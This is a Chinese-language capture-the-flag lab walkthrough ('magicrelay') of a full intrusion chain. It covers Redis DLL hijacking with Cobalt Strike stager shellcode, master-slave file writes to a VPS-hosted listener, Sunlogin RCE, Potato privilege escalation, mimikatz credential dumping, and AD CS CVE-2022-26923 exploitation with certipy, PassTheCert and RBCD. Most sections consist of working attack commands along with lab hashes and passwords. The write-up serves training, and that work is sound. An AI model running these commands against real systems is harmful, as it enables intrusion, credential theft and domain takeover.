---
title: "春秋云镜 magicrelay"
onlyTitle: true
date: 2026-1-15 16:30:21
categories:
- 渗透
- 春秋云镜
tags:
- 春秋云镜
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8187.png
---



## 春秋云镜 magicrelay

### flag1

fscan -h 39.99.228.176

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251015221451894.png)

redis未授权

redis-cli -h 39.99.228.176

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251015221941294.png)

info一下看下信息，看到配置文件位置

C:\Program Files\Redis\redis.windows-service.conf

也就说是windows系统

关于redis的各种利用手法：

| 方式         | 利用方法                                                     | 利用要求                                                     |
| ------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
| Webshell     | 有IIS服务的情况下，可以尝试往`C:/inetpub/wwwroot/`写Webshell，其他Web服务要猜目录 | Administrator能直接写，普通用户看运气，Network Service权限写不了 |
| 启动项       | 比如往startup目录写启动项，但需要重启                        | Administrator能直接写，普通用户需要猜用户名，Network Service权限写不了 |
| 覆写system32 | 比如把cmd.exe覆写到sethc.exe，然后在RDP登录界面调出命令行窗口 | 要System权限才能写                                           |
| 加载模块     | 4.x之后的Redis允许用户加载自定义dll，可用主从复制写入恶意DLL，直接加载执行 | 无权限要求，但3.x的Redis并没有模块加载的功能                 |
| DLL劫持      | 劫持dbghelp.dll，主从复制写入恶意DLL并通过Redis命令触发      | 无权限要求                                                   |
| 其他花式     | 比如写一个exe马，再整个快捷方式伪装一下放到桌面上，等运维人员打开 | Administrator能直接写，普通用户需要猜用户名，Network Service权限写不了 |

这些方法除了DLL劫持都要靠运气，只有DLL劫持能稳定利用并且对权限没有要求，也不会破坏原本的服务。

https://xz.aliyun.com/news/13892?u_atoken=b3a75be672265d77a53604a111e28958&u_asig=0a47319217406169222756739e0032

非常好思路，使我的大脑开始旋转

>说到Linux上的Redis，getshell的路子无非两类：一类是直接写入文件，可以是webshell也可以是计划任务，亦或是ssh公钥；另一种是Redis4.x、5.x上的主从getshell，这比写东西来的更直接方便。
>到了Windows上，事情变得难搞了。
>
>3.x版本的Redis并没有模块加载的功能，而微软官方的Redis最高就到3.2.100和3.0.504，更高版本的Windows Redis都是第三方的，这也是实战中Windows服务器上的Redis几乎全是3.2.100和3.0.504的原因
>
>首先，Windows的启动项和计划任务并不是以文本形式保存在固定位置的，因此这条路行不通；Web目录写马条件又比较苛刻，首先这台机器上要有Web，其次还要有机会泄露Web的绝对路径；而Windows的Redis最新版本还停留在3.2，利用主从漏洞直接getshell也没戏了。

在Windows操作系统中，动态链接库（DLL）用于存放通用代码，供多个应用程序共享使用。当一个程序需要调用DLL中的函数时，它首先会尝试从特定路径加载DLL文件。如果该程序未指定DLL的绝对路径，而是仅指定了DLL的名字，系统将按照预设的顺序搜索DLL文件的位置。这种机制为攻击者提供了机会，通过在高优先级路径放置恶意DLL来实施DLL劫持攻击。

 

标准的DLL查找顺序：

应用程序目录->系统目录（如C:\Windows\System32）->16位系统目录（如C:\Windows\SysWOW64）

->Windows目录（如C:\Windows）->当前工作目录 -> 系统环境变量PATH中指定的路径

例如，如果"example.exe"尝试加载名为"example.dll"的DLL但没有提供完整路径，系统会在上述顺序中寻找此DLL。若攻击者提前在应用程序目录放置了同名的恶意DLL，该恶意DLL会被优先加载执行。

从本地的system32文件夹下提取出 `dbghelp.dll`

使用如下脚本

https://github.com/JKme/sb_kiddie-/blob/master/hacking_win/dll_hijack/DLLHijacker.py

```sh
python DllHijacker.py dbghelp.dll 
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251015225515586.png)

生成一个项目文件，vs打开项目文件

>vs download : aka.ms/vs/16/release/vs_community.exe

勾选使用C++的桌面开发，不然后面没有库文件

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260114210237944.png)

请在VS2019中修改项目的属性，如果不改，那么靶机无法加载生成出来的DLL
 **属性->C/C++->代码生成->运行库->多线程 (/MT)如果是debug则设置成MTD**
 **属性->C/C++->代码生成->禁用安全检查GS**
 **关闭生成清单 属性->链接器->清单文件->生成清单 选择否**

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251015234639783.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20251015234827920.png)

（win 10好像和win 11的 dbghelp.dll是一样的）

这里需要生成有阶段(steger)的马，体积会很小（很容易理解有阶段就是先下小马，小马下大马），直接用无阶段的stegerless马去生成dll会体积过大而报错

有阶段的马只能反向连接，体现在cs里就是只能生成Http/s dns的马。这里两个地方http hosts都填vps ip(teamserver ip)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260114203259289.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260114203558334.png)

这样生成出来只有几乎900个bytes

修改Hijack函数里的shellcode，选择release x64生成

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260114203854331.png)

用RedisWriteFile来进行主从复制写文件

https://github.com/r35tart/RedisWriteFile

lhost和lport是vps ip和端口，RedisWriteFile需要在vps上运行

```
python3 RedisWriteFile.py --rhost 39.99.154.44 --rport 6379 --lhost 117.72.74.197  --lport 1992 --rpath 'C:\\Program Files\\Redis\\' --rfile 'dbghelp.dll' --lfile '/root/dbghelp.dll'
```

redis-cli -h 39.99.154.44上去bgsave一下触发劫持

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260114212154367.png)

![0b3e79d209b470977f7d515accf4b6bf](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/0b3e79d209b470977f7d515accf4b6bf.png)

administrator权限

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260114214301027.png)

cs这个文件管理反应好慢，好像得根据beacon心跳来的

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260114214927515.png)

打着打着掉了，二刷直接生成了vshell shellcode到dbghelp.cpp中（噢原来是得本地换个端口，原来的1999端口用过一遍就被占用了）

> cs上传vshell
>
> upload C:\Users\Administrator\Downloads\tcp_windows_amd64.exe C:\Users\Public\tcp_windows_amd64.exe

upload D:\ctf-tools\SweetPotato.exe

### flag2

上传fscan和gost

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260114222444247.png)

好慢好慢，燃烧沙砾

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260114222904489.png)

整理信息：

```
172.22.12.6 DC:win-server应该是域控 windows 2016
172.22.12.31 IIS 存在FTP匿名登陆，FTP下存在向日葵v11
172.22.12.25 本机
172.22.12.12 IIS poc-yaml-active-directory-certsrv-detect
```

先打31，直接用工具：

https://github.com/Mr-xn/sunlogin_rce

gost代理

```
gost -L socks5://:5555?bind=true
gost -L rtcp://:2222/39.99.154.44:22 -F socks5://39.99.154.44:5555
```

xrkRce扫描

```
xrkRce.exe -h 172.22.12.31 -t scan
```

这个扫描好像是全端口扫描，也是慢的没边了兄弟

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260114224026601.png)

执行命令

```text
xrkRce.exe -h 172.22.12.31 -t rce -p 49688 -c "whoami"
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260114224105935.png)

```
rkRce.exe -h 172.22.12.31 -t rce -p 49688 -c "type "C:\Users\Administrator\flag\flag02.txt""
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260114225230221.png)

根据fscan的结果，31这台机器前面是WorkGroup工作组环境，并没有在域环境下，所以打到这就算结束了

### flag4

回到25机器，这台机器是域环境，但是我们拿到的是个工作组administrator，需要提权到域用户

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260115152248485.png)

该机器存在SeImpersonatePrivilege

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260115152423032.png)

https://github.com/gtworek/Priv2Admin

依旧看下特权利用的网站，这个权限允许在其他用户的安全环境中创建进程，利用工具也是Potato家族的提权软件都能用

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260115152627376.png)

上传甜土豆进行提权

https://raw.githubusercontent.com/uknowsec/SweetPotato/master/SweetPotato-Webshell-new/bin/Release/SweetPotato.exe

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260115153013304.png)

上传SharpHound进行信息收集，这里用甜土豆执行会执行过快导致中断，重新用甜土豆跑一遍vshell马弹回域权限shell再执行

额这个环境好容易打坏，开了三个，vshell始终接收不到，用的viper（0分靶场）

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260115170111593.png)

采个数据内网一直timeout，你要毁了这个家吗，0分鉴定

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260115170728733.png)

最后viper上线vshell SharpHound了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260115171258492.png)

费了老大劲，结果收集到的信息只有一台WIN-server，其他机器没有path可以到这个DC

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260115172818953.png)

根据前面fscan的信息，12主机存在poc-yaml-active-directory-certsrv-detect，可以用证书模板漏洞打，也就是网鼎杯2022的CVE-2022-26923

https://www.cnblogs.com/kqdssheng/p/18916959

>CVE-2022-26923 是一种 AD 域权限提升漏洞，允许普通用户在启用 Active Directory 证书服务（AD CS） 的域环境中将权限提升至域管理员。漏洞原因在于 AD CS 在为机器账户签发证书时（**这是一种支持 Kerberos 证书认证的证书**），不会验证证书请求中请求账户的 UPN （即机器账户属性 DNSHostname ）是否属于请求者，而是直接认为账户的 UPN 就是请求者。这使得，如果攻击者伪造 UPN 字段为 **域控机器账户**，那 ADCS 便会为其签发一个域控机器账户的证书（相当于域管理员身份）。攻击者进而便可以使用该证书进行 Kerberos 证书认证，从而直接获得一个类似管理员身份的 TGT 票据。
>
>要利用此方法进行恶意攻击，攻击者只需找到域中任意一个标准用户的凭据即可。这样，他们就可以以标准用户的身份创建一个机器账户  A，然后篡改该机器账户 A 的属性 DNSHostname 为 DC 的机器账户 。一旦篡改完成，攻击者便可以以机器账户 A 的身份请求到 DC 的机器账户的证书，进而凭借证书获取到获得 DC 的 TGT 以及 DC 的 NTLM 哈希，最后便可以使用 DC  的哈希转储整个域中的所有哈希值。

影响到win11 21H2未打补丁版，几乎只要用了证书服务器，都可以考虑打这个

先hashdump，hashdump好像抓不到机器账户的hash噢

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260115173049910.png)

上传mimikatz或者用kiwi

```sh
mimikatz.exe "privilege::debug sekurlsa::logonpasswords full" exit
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260115173822117.png)

WIN-YUYAOX91$机器用户NTLM e611213c6a712f9b18a8d056005a4f0f

certutil查看证书颁发机构，因为后面打证书模板攻击的时候需要找到证书Server，也就是WIN-AUTHORITY.xiaorang.lab，不然会报错

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260115173937023.png)

```text
172.22.12.6 WIN-SERVER.xiaorang.lab
172.22.12.12 WIN-AUTHORITY.xiaorang.lab
```

用certipy找下有没有ECS漏洞先

```powershell
certipy find -u WIN-YUYAOX9Q$ -hashes e611213c6a712f9b18a8d056005a4f0f -dc-ip 172.22.12.6 -vulnerable -stdout
```

没弹出 [!] Vulnerabilities，但是知道了证书名

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260115175137784.png)

需要一个域内用户账号创建一个机器账号，此机器账号用于冒充域管。用前面抓到的hash添加一个机器用户

```sh
certipy account create -u WIN-YUYAOX9Q$ -hashes e611213c6a712f9b18a8d056005a4f0f  -dc-ip 172.22.12.6 -user godown -dns WIN-SERVER.xiaorang.lab
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260115175903519.png)

新建了godown$/eeGjrJkhluSoo5NR

获取fpx凭证

```sh
certipy req -u godown$@xiaorang.lab -p eeGjrJkhluSoo5NR -ca xiaorang-WIN-AUTHORITY-CA -target 172.22.12.12 -template Machine -dc-ip 172.22.12.6

certipy auth -pfx win-server.pfx -dc-ip 172.22.12.6
```

报错了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260115180219518.png)

在网鼎杯靶场那里也提过，我直接粘贴过来

下一步用证书模板去认证，但是题目本身有点问题会报错，不能直接certipy auth -pfx上去

> 当域控制器没有安装用于智能卡身份验证的证书（例如，使用 “域控制器” 或 “域控制器身份验证” 模板）、用户密码已过期或提供了错误的密码时，可能会出现此问题。
>
> 遇到这种情况，则无法使用得到的证书来获取 TGT 或 NTLM 哈希。

AD 默认支持两种协议的证书身份验证: Kerberos PKINIT 协议和 Schannel

尝试 Schannel，通过 Schannel将证书传递到 LDAPS, 修改 LDAP 配置 (例如配置 RBCD / DCSync), 进而获得域控权限。

>Secure Channel（Schannel）是 Windows 在建立 TLS/SSL 连接时利用的 SSP。默认情况下，AD 环境中没有多少协议支持通过 Schannel 开箱即用的 AD 身份验证。WinRM、RDP 和 IIS 都支持使用  Schannel 的客户端身份验证，但它需要额外的配置，并且在某些情况下（如 WinRM）不与 Active Directory  集成。令一种通常有效的协议是 LDAPS（又名 LDAP over SSL/TLS）。事实上，从 AD  技术规范（MS-ADTS）中了解到，甚至可以直接对 LDAPS 进行客户端证书身份验证。
>
>

https://whoamianony.top/posts/pass-the-certificate-when-pkinit-is-nosupp/

openssl生成证书密钥，密码置空即可

```
openssl pkcs12 -in win-server.pfx -nodes -out test.pem
openssl rsa -in test.pem -out test.key
openssl x509 -in test.pem -out test.crt
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260115180628933.png)

下载https://github.com/AlmondOffSec/PassTheCert/blob/main/Python/passthecert.py

传递证书，先试探一下whoami，没问题

```
python passthecert.py -action whoami -crt test.crt -key test.key -domain xiaorang.lab -dc-ip 172.22.12.6
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260115180932057.png)

把godown机器账户证书服务器的委派关系到证书服务器上

```
python passthecert.py -action write_rbcd -crt test.crt -key test.key -domain xiaorang.lab -dc-ip  172.22.12.6 -delegate-to win-server$ -delegate-from godown$
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260115181617231.png)

该 POC 执行后，会通过提供的证书认证到 LDAPS，创建一个新的机器账户，并为指定的机器账户设置 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性，以执行基于资源的约束委派（RBCD）攻击。相当于新建了一个机器用户去打RBCD

既然新用户已经打完RBCD了，那重新申请一遍ST，用新用户去dump域控TGT

```sh
python getST.py xiaorang.lab/godown$:eeGjrJkhluSoo5NR -spn cifs/WIN-SERVER.xiaorang.lab -impersonate Administrator -dc-ip 172.22.12.6
set KRB5CCNAME=Administrator@cifs_WIN-SERVER.xiaorang.lab@XIAORANG.LAB.ccache
python psexec.py Administrator@WIN-SERVER.xiaorang.lab -k -no-pass -dc-ip 172.22.12.6
```

丝滑小连招

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260115182007903.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260115182046275.png)

flag04: flag{4c7d6e81-3161-4853-b93f-349ab74a60e5}



和网鼎杯的证书打法不同的仅是网鼎杯扫出了ECS 8，用的ECS 8去添加机器账户，而这里用的CVE-2022-26923

### flag3

在域控上添加账户，RDP上去，用mimikatz dump域管hash，然后横向到172.22.12.6

```sh
python psexec.py xiaorang.lab/administrator@172.22.12.12 -hashes :aa95e708a5182931157a526acf769b13 -dc-ip 172.22.12.6
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260115182319460.png)

flag03: flag{317621a6-bb66-4154-b157-365c871d52d2}

噢原来最低只能一分啊

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260115182606711.png)